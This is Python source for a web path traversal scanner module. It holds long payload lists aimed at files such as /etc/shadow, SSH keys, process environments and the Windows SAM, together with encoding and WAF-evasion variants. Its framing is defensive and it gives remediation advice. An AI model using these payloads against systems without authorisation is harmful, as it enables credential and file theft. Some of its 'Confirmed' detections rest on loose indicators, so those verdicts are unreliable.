"""
path_traversal_scanner.py — Advanced Path Traversal / Directory Traversal Scanner
==================================================================================
Scans for Path Traversal vulnerabilities using multi-stage detection.
Probes endpoints with traversal payloads, then confirms via file content indicators.
"""
import urllib.parse
from scanners.base_scanner import BaseScanner
from utils.anomaly import SizeAnomalyDetector
from utils.evasion import waf_evade
from utils.callback import build_callback_url

def _expand_with_waf_evade(payloads: list[str]) -> list[str]:
    expanded = list(payloads)
    for p in payloads:
        for name, variant in waf_evade(p):
            expanded.append(variant)
    return expanded

PATH_TRAVERSAL_PAYLOADS = [
    # === Linux/Unix patterns ===
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../etc/shadow",
    "../../../etc/hosts",
    "../../../etc/hostname",
    "../../../etc/issue",
    "../../../etc/group",
    "../../../etc/passwd-",
    "../../../etc/shadow-",
    "../../../etc/ssh/sshd_config",
    "../../../etc/ssh/id_rsa",
    "../../../etc/apache2/apache2.conf",
    "../../../etc/nginx/nginx.conf",
    "../../../etc/my.cnf",
    "../../../etc/mysql/my.cnf",
    "../../../proc/self/environ",
    "../../../proc/self/cmdline",
    "../../../proc/self/fd/0",
    "../../../proc/self/fd/1",

    # === Windows patterns ===
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\boot.ini",
    "..\\..\\..\\..\\windows\\system32\\config\\SAM",
    "..\\..\\..\\..\\windows\\system32\\config\\system",
    "..\\..\\..\\..\\windows\\system32\\config\\software",
    "..\\..\\..\\..\\windows\\repair\\SAM",
    "..\\..\\..\\..\\windows\\php.ini",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\networks",
    "..\\..\\..\\..\\autoexec.bat",

    # === URL Encoding Bypasses ===
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%ae..%c0%ae..%c0%aefetc%c0%aepasswd",
    "..%25252f..%25252f..%25252fetc%25252fpasswd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
    "..%uff0e%uff0e%u2215etc%u2215passwd",
    "..%uff0e%uff0e%u2215..%uff0e%uff0e%u2215..%uff0e%uff0e%u2215etc%u2215passwd",

    # === Double URL Encoding ===
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%25252f..%25252f..%25252fetc%25252fpasswd",
    "..%2525252f..%2525252f..%2525252fetc%2525252fpasswd",

    # === 16-bit Unicode Encoding ===
    "..%u002f..%u002f..%u002fetc%u002fpasswd",
    "..%u2215..%u2215..%u2215etc%u2215passwd",
    "..%uff0f..%uff0f..%uff0fetc%uff0fpasswd",

    # === Absolute paths ===
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "C:\\windows\\system32\\drivers\\etc\\hosts",
    "C:\\windows\\win.ini",
    "C:\\boot.ini",
    "C:\\windows\\system32\\config\\SAM",

    # === Null byte injection (older systems) ===
    "../../../etc/passwd%00",
    "../../../../etc/passwd%00.jpg",
    "../../../../etc/passwd%00.png",
    "../../../../etc/passwd%00.html",
    "../../../../etc/passwd%00.txt",

    # === Traversal with file wrappers ===
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/hosts",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",

    # === ZIP/Tar Slip ===
    "....//....//....//etc/passwd",
    "....\\....\\....\\windows\\win.ini",
    "..;/..;/..;/etc/passwd",
    "..\\/..\\/..\\/etc/passwd",
    "/..//..//..//etc/passwd",
]

EVADED_TRAVERSAL_PAYLOADS = _expand_with_waf_evade(PATH_TRAVERSAL_PAYLOADS)

CONTENT_SIGNATURES = {
    "/etc/passwd": ["root:x:0:0", "daemon:x:", "bin:x:", "nobody:x:"],
    "/etc/hosts": ["127.0.0.1", "localhost", "::1"],
    "/etc/shadow": ["root:$", "daemon:$", ":$1$", ":$5$", ":$6$"],
    "/etc/issue": ["Ubuntu", "Debian", "CentOS", "Red Hat", "Fedora", "SUSE"],
}

ZIP_SLIP_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
    "..\\/..\\/..\\/etc/passwd",
    "/..//..//..//etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "....//....//....//windows/win.ini",
]

EVADED_ZIP_SLIP = _expand_with_waf_evade(ZIP_SLIP_PAYLOADS)

PATH_TRAVERSAL_INDICATORS = [
    "root:x:0:0",
    "root:!:",
    "root::",
    "localhost",
    "[boot loader]",
    "[extensions]",
    "[fonts]",
    "127.0.0.1",
    "www-data",
    "nobody",
    "daemon:",
    "bin:",
    "sshd:",
    "mysql:",
    "postgres:",
    "x:0:0:",
    "::1",
    "10.",
    "192.168.",
    "rhosts",
    "ssh-rsa",
    "BEGIN SSH2",
]


class PathTraversalScanner(BaseScanner):
    SCANNER_NAME = "Path Traversal Scanner"
    _SCANNER_KEY = "path_traversal"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)
        self.timeout = kwargs.get("timeout", 8)
        self.max_depth = kwargs.get("max_depth", 1)
        self.delay = kwargs.get("delay", 0.2)
        self.exclude_paths = kwargs.get("exclude_paths", [])
        self._tested_params = 0
        self._traversal_found = 0
        self._size_detector = SizeAnomalyDetector()
        self._oob_url = build_callback_url("/path-traversal")

    def test_path_traversal(self, url, param_name, method="GET", form_inputs=None):
        """Test a specific parameter for path traversal — multi-stage: probe then confirm."""
        self._tested_params += 1

        # Stage 1: Probe with simple relative path to test file inclusion
        probe_payload = "../../../etc/hosts"
        try:
            if method.upper() == "GET":
                parsed = urllib.parse.urlparse(url)
                query_params = urllib.parse.parse_qs(parsed.query)
                query_params[param_name] = [probe_payload]
                new_query = urllib.parse.urlencode(query_params, doseq=True)
                test_url = urllib.parse.urlunparse(
                    (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
                )
                probe_body, probe_status = self._make_request(test_url, timeout=self.timeout)
            else:
                data = {}
                if form_inputs:
                    for inp in form_inputs:
                        data[inp["name"]] = inp["value"] or "test"
                data[param_name] = probe_payload
                encoded_data = urllib.parse.urlencode(data).encode("utf-8")
                probe_body, probe_status = self._make_request(
                    url, method="POST", data=encoded_data,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    timeout=self.timeout,
                )

            if probe_body is None:
                return False
        except Exception as e:
            self.log("ERROR", f"[PathTraversal] Error probing param {param_name} on {url}: {e}")
            return False

        baseline_sizes = []
        for bp in ["../../nonexistent", "xxx", "invalid"]:
            try:
                if method.upper() == "GET":
                    parsed = urllib.parse.urlparse(url)
                    qp = urllib.parse.parse_qs(parsed.query)
                    qp[param_name] = [bp]
                    b_url = urllib.parse.urlunparse(
                        (parsed.scheme, parsed.netloc, parsed.path, parsed.params,
                         urllib.parse.urlencode(qp, doseq=True), parsed.fragment)
                    )
                    b_body, _ = self._make_request(b_url, timeout=self.timeout)
                else:
                    d = {}
                    if form_inputs:
                        for inp in form_inputs:
                            d[inp["name"]] = inp["value"] or "test"
                    d[param_name] = bp
                    b_body, _ = self._make_request(
                        url, method="POST", data=urllib.parse.urlencode(d).encode("utf-8"),
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        timeout=self.timeout,
                    )
                if b_body:
                    baseline_sizes.append(len(b_body))
            except Exception as e:
                self.log("ERROR", f"[PathTraversal] Baseline request error: {e}")
        for s in baseline_sizes:
            self._size_detector.record_size(s)

        # Stage 2: Send full payload set for confirmation
        combined_payloads = list(EVADED_TRAVERSAL_PAYLOADS) + list(EVADED_ZIP_SLIP)
        for payload in combined_payloads:
            try:
                if method.upper() == "GET":
                    parsed = urllib.parse.urlparse(url)
                    query_params = urllib.parse.parse_qs(parsed.query)
                    query_params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(query_params, doseq=True)
                    test_url = urllib.parse.urlunparse(
                        (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
                    )
                    body, status = self._make_request(test_url, timeout=self.timeout)
                else:
                    data = {}
                    if form_inputs:
                        for inp in form_inputs:
                            data[inp["name"]] = inp["value"] or "test"
                    data[param_name] = payload
                    encoded_data = urllib.parse.urlencode(data).encode("utf-8")
                    body, status = self._make_request(
                        url, method="POST", data=encoded_data,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        timeout=self.timeout,
                    )

                if body is None:
                    continue

                response_text = body

                # Size anomaly detection
                if self._size_detector.has_baseline and self._size_detector.test_size(len(response_text)):
                    self._traversal_found += 1
                    vector_desc = f"{method} {url} -> parameter '{param_name}'"
                    self.log("CRITICAL",
                             f"[PathTraversal] DETECTED (size anomaly)! Vector: {vector_desc} | "
                             f"Payload: {payload[:60]} | Size: {len(response_text)}")
                    self.add_vuln(
                        title="Path Traversal / Directory Traversal",
                        severity="High",
                        category="Injection",
                        cvss_score=8.5,
                        description=(
                            f"A Path Traversal vulnerability was confirmed on {vector_desc}.\n"
                            f"Payload: `{payload}`\n"
                            f"Response size anomaly detected: {len(response_text)} bytes vs baseline.\n\n"
                            f"Impact: Attackers can read arbitrary files from the server's file system."
                        ),
                        remediation=(
                            "1. Avoid passing user-supplied input directly to file system APIs.\n"
                            "2. Use an allowlist of permitted file names or extensions.\n"
                            "3. Use standard path sanitisation methods.\n"
                            "4. Use indirect identifiers rather than raw file names.\n"
                            "5. Ensure the application process runs with the least privileges required."
                        ),
                        evidence=f"Size anomaly: {len(response_text)} bytes (z={self._size_detector.z_score(float(len(response_text))):.1f})",
                        payload=payload[:200],
                        request_details=f"Vector: {vector_desc}, Payload: {payload[:60]}",
                        response_details=f"Response length: {len(response_text)} chars",
                        confidence="Confirmed",
                        cwe_ids=["CWE-22"],
                        owasp_category="A01:2021 – Broken Access Control",
                    )
                    return True

                # Check for content signatures
                sig_matches = []
                for sig_file, indicators in CONTENT_SIGNATURES.items():
                    for ind in indicators:
                        if ind in response_text:
                            sig_matches.append((sig_file, ind))
                            break
                if sig_matches:
                    self._traversal_found += 1
                    vector_desc = f"{method} {url} -> parameter '{param_name}'"
                    sig_str = "; ".join(f"{f}={i}" for f, i in sig_matches)
                    self.log("CRITICAL",
                             f"[PathTraversal] DETECTED! Vector: {vector_desc} | "
                             f"Payload: {payload[:60]} | Content: {sig_str}")
                    self.add_vuln(
                        title="Path Traversal / Directory Traversal",
                        severity="High",
                        category="Injection",
                        cvss_score=8.5,
                        description=(
                            f"A Path Traversal vulnerability was confirmed on {vector_desc}.\n"
                            f"Payload: `{payload}`\n"
                            f"The server responded with content containing file signatures: {sig_str}.\n\n"
                            f"Impact: Attackers can read arbitrary files from the server's file system."
                        ),
                        remediation=(
                            "1. Avoid passing user-supplied input directly to file system APIs.\n"
                            "2. Use an allowlist of permitted file names or extensions.\n"
                            "3. Use standard path sanitisation methods.\n"
                            "4. Use indirect identifiers rather than raw file names.\n"
                            "5. Ensure the application process runs with the least privileges required."
                        ),
                        evidence=f"Content signature match: {sig_str}",
                        payload=payload[:200],
                        request_details=f"Vector: {vector_desc}, Payload: {payload[:60]}",
                        response_details=f"Response length: {len(response_text)} chars, Signatures: {sig_str}",
                        confidence="Confirmed",
                        cwe_ids=["CWE-22"],
                        owasp_category="A01:2021 – Broken Access Control",
                    )
                    return True

                # Check for file content indicators
                for indicator in PATH_TRAVERSAL_INDICATORS:
                    if indicator in response_text:
                        self._traversal_found += 1
                        vector_desc = f"{method} {url} -> parameter '{param_name}'"
                        self.log("CRITICAL",
                                 f"[PathTraversal] DETECTED! Vector: {vector_desc} | "
                                 f"Payload: {payload[:60]} | Indicator: {indicator}")

                        self.add_vuln(
                            title="Path Traversal / Directory Traversal",
                            severity="High",
                            category="Injection",
                            cvss_score=8.5,
                            description=(
                                f"A Path Traversal vulnerability was confirmed on {vector_desc}.\n"
                                f"Payload: `{payload}`\n"
                                f"The server responded with content containing a file system indicator: `{indicator}`.\n\n"
                                f"Impact: Attackers can read arbitrary files from the server's file system, potentially exposing "
                                f"source code, application configuration, credentials, and sensitive system logs."
                            ),
                            remediation=(
                                "1. Avoid passing user-supplied input directly to file system APIs.\n"
                                "2. Use an allowlist of permitted file names or extensions.\n"
                                "3. Use standard path sanitisation methods (e.g., in Python, use `os.path.abspath` or `pathlib.Path.resolve` "
                                "   and verify that the path remains within the intended root directory).\n"
                                "4. Use indirect identifiers (e.g., file index numbers) rather than raw file names.\n"
                                "5. Ensure the application process runs with the least privileges required."
                            ),
                            evidence=f"File content indicator found: {indicator}",
                            payload=payload[:200],
                            request_details=f"Vector: {vector_desc}, Payload: {payload[:60]}",
                            response_details=f"Response length: {len(response_text)} chars, Indicator: {indicator}",
                            confidence="Confirmed",
                            cwe_ids=["CWE-22"],
                            owasp_category="A01:2021 – Broken Access Control",
                        )
                        return True

            except Exception as e:
                self.log("ERROR", f"[PathTraversal] Error testing payload '{payload[:30]}...' on {url}: {e}")

        return False

    def fuzz_form(self, form):
        action = form["action"]
        method = form["method"].upper()
        inputs = form["inputs"]
        fuzzable_inputs = [i for i in inputs if i["type"] not in ("submit", "button", "hidden")]
        if not fuzzable_inputs:
            return

        self.log("INFO", f"[PathTraversal] Fuzzing form inputs at {action} ({len(fuzzable_inputs)} inputs)")
        for inp in fuzzable_inputs:
            param_name = inp["name"]
            if self.test_path_traversal(action, param_name, method, inputs):
                break

    def fuzz_url_params(self, url):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return

        self.log("INFO", f"[PathTraversal] Fuzzing query parameters on {parsed.path}")
        for param_name in params:
            if self.test_path_traversal(url, param_name, "GET"):
                break

    def run(self) -> list[dict]:
        self.log("INFO",
                 f"[PathTraversal] Starting Path Traversal scan on {self.target}... "
                 f"({len(PATH_TRAVERSAL_PAYLOADS)} payloads, "
                 f"{len(PATH_TRAVERSAL_INDICATORS)} indicators)")

        try:
            # Step 1: Run crawler to find scan targets
            crawl_results = self.discovery_context or {"forms": [], "urls": []}

            # Step 2: Fuzz discovered forms
            for form in crawl_results["forms"]:
                self.fuzz_form(form)

            # Step 3: Fuzz discovered URLs (parameters)
            for url_entry in crawl_results["urls"]:
                self.fuzz_url_params(url_entry["url"])

        except Exception as e:
            self.log("ERROR", f"[PathTraversal] Unexpected exception during scan: {e}")

        self.log("SUCCESS",
                 f"[PathTraversal] Path Traversal audit complete. "
                 f"{self._traversal_found} issue(s) found out of {self._tested_params} tested.")
        return self.vulns
